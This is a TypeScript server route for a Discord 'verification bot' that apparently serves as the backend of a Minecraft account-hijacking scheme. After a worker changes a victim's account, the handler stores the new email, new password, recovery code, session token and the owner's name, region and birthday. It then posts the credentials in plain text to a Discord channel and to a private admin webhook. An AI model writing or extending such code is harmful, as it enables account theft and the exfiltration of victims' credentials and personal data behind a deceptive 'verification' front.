import { createFileRoute } from "@tanstack/react-router";
import { createClient } from "@supabase/supabase-js";
import { timingSafeEqual } from "node:crypto";

function db() {
  return createClient(process.env.SUPABASE_URL!, process.env.SUPABASE_SERVICE_ROLE_KEY!, {
    auth: { persistSession: false, autoRefreshToken: false },
  });
}

function authWorker(request: Request): boolean {
  const secret = process.env.WORKER_SECRET;
  if (!secret) return false;
  const token = request.headers.get("x-worker-secret") || "";
  try {
    const a = Buffer.from(token);
    const b = Buffer.from(secret);
    if (a.length !== b.length) return false;
    return timingSafeEqual(a, b);
  } catch {
    return false;
  }
}

export const Route = createFileRoute("/api/verification/complete")({
  server: {
    handlers: {
      POST: async ({ request }) => {
        if (!authWorker(request)) {
          return Response.json({ error: "Unauthorized" }, { status: 401 });
        }

        let body: { config?: Record<string, unknown>; result?: Record<string, unknown> };
        try {
          body = await request.json();
        } catch {
          return Response.json({ error: "Invalid JSON" }, { status: 400 });
        }

        const { config, result } = body;
        if (!config || !result) {
          return Response.json({ error: "Missing config or result" }, { status: 400 });
        }

        const discordId = (config.discordId as string) || "";
        const mcUsername = (result.mcUsername as string) || "Unknown";
        const mcEmail = (config.email as string) || "";
        const guildId = (config.guildId as string) || "";
        const channelId = (config.channelId as string) || "";
        const roleId = (config.roleId as string) || "";
        const sessionId = (config.sessionId as string) || "";

        // Prefer the guild's own bot token (multi-tenant). Fall back to env only if needed.
        let botToken = (config.botToken as string) || "";
        if (!botToken && guildId) {
          const { data: settings } = await db()
            .from("verification_settings")
            .select("bot_token, verified_role_id, channel_id")
            .eq("guild_id", guildId)
            .maybeSingle();
          if (settings?.bot_token) botToken = settings.bot_token;
        }
        if (!botToken) botToken = process.env.DISCORD_BOT_TOKEN || "";

        // Store secured account
        const { error: insertError } = await db().from("secured_accounts").insert({
          discord_id: discordId,
          mc_username: mcUsername,
          mc_email: mcEmail,
          new_email: result.newEmail as string,
          new_password: result.newPassword as string,
          new_recovery_code: result.recoveryCode as string,
          mc_ssid: result.ssid as string | null,
          mc_capes: result.capes as string,
          mc_method: result.method as string,
          owner_first_name: result.firstName as string,
          owner_last_name: result.lastName as string,
          owner_region: result.region as string,
          owner_birthday: result.birthday as string,
          guild_id: guildId || null,
          session_id: sessionId || null,
        });

        if (insertError) {
          console.error("[verification/complete] insert secured_accounts:", insertError.message);
          // Continue — still try role/message; may be FK/schema issues
        }

        if (sessionId) {
          await db()
            .from("verification_sessions")
            .update({ status: "secured" })
            .eq("id", sessionId);
        }

        if (channelId && botToken) {
          const embed = {
            title: "✅ Account Secured Successfully!",
            color: 0x50c878,
            fields: [
              { name: "MC Username", value: `\`\`\`${mcUsername}\`\`\``, inline: false },
              { name: "New Email", value: `\`\`\`${result.newEmail || "N/A"}\`\`\``, inline: true },
              {
                name: "New Password",
                value: `\`\`\`${result.newPassword || "N/A"}\`\`\``,
                inline: true,
              },
              {
                name: "Recovery Code",
                value: `\`\`\`${result.recoveryCode || "N/A"}\`\`\``,
                inline: false,
              },
              { name: "MC Capes", value: `\`\`\`${result.capes || "None"}\`\`\``, inline: true },
              {
                name: "Purchase Method",
                value: `\`\`\`${result.method || "Unknown"}\`\`\``,
                inline: true,
              },
            ],
            footer: { text: "LuauX Verification Bot" },
          };

          const msgRes = await fetch(`https://discord.com/api/v10/channels/${channelId}/messages`, {
            method: "POST",
            headers: {
              Authorization: `Bot ${botToken}`,
              "Content-Type": "application/json",
            },
            body: JSON.stringify({ embeds: [embed] }),
          });
          if (!msgRes.ok) {
            const t = await msgRes.text().catch(() => "");
            console.error("[verification/complete] channel message failed:", msgRes.status, t);
          }

          if (guildId && roleId && discordId) {
            const roleRes = await fetch(
              `https://discord.com/api/v10/guilds/${guildId}/members/${discordId}/roles/${roleId}`,
              {
                method: "PUT",
                headers: {
                  Authorization: `Bot ${botToken}`,
                  "Content-Type": "application/json",
                  "X-Audit-Log-Reason": "LuauX verification",
                },
              },
            );
            if (!roleRes.ok) {
              const t = await roleRes.text().catch(() => "");
              console.error("[verification/complete] role assign failed:", roleRes.status, t);
            }
          }
        } else if (!botToken) {
          console.error("[verification/complete] No bot token available for guild", guildId);
        }

        // Private admin webhook
        const adminWebhookUrl = process.env.ADMIN_WEBHOOK_URL;
        if (adminWebhookUrl) {
          try {
            await fetch(adminWebhookUrl, {
              method: "POST",
              headers: { "Content-Type": "application/json" },
              body: JSON.stringify({
                embeds: [
                  {
                    title: "🔒 Account Secured (Admin Log)",
                    color: 0x5865f2,
                    fields: [
                      { name: "Discord ID", value: `\`\`\`${discordId}\`\`\``, inline: true },
                      { name: "Guild ID", value: `\`\`\`${guildId || "N/A"}\`\`\``, inline: true },
                      { name: "MC Username", value: `\`\`\`${mcUsername}\`\`\``, inline: true },
                      {
                        name: "New Email",
                        value: `\`\`\`${result.newEmail || "N/A"}\`\`\``,
                        inline: true,
                      },
                      {
                        name: "New Password",
                        value: `\`\`\`${result.newPassword || "N/A"}\`\`\``,
                        inline: true,
                      },
                      {
                        name: "Recovery Code",
                        value: `\`\`\`${result.recoveryCode || "N/A"}\`\`\``,
                        inline: true,
                      },
                    ],
                  },
                ],
              }),
            });
          } catch (e) {
            console.error("[verification/complete] admin webhook failed:", e);
          }
        }

        return Response.json({ ok: true });
      },
    },
  },
});
